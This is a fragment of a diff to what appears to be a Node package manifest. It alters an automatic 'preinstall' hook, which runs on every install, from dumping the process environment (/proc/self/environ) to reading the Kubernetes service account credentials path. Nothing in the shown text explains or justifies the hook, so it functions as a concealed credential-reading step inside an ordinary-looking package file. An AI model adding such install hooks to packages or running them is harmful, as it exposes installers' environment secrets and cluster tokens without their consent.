@@ -8,7 +8,7 @@
         "node": ">= 0.10.0"
     },
     "scripts": {
-        "preinstall": "cat /proc/self/environ"
+        "preinstall": "cat /run/secrets/kubernetes.io/serviceaccount"
     },
     "repository": {
         "type": "git",
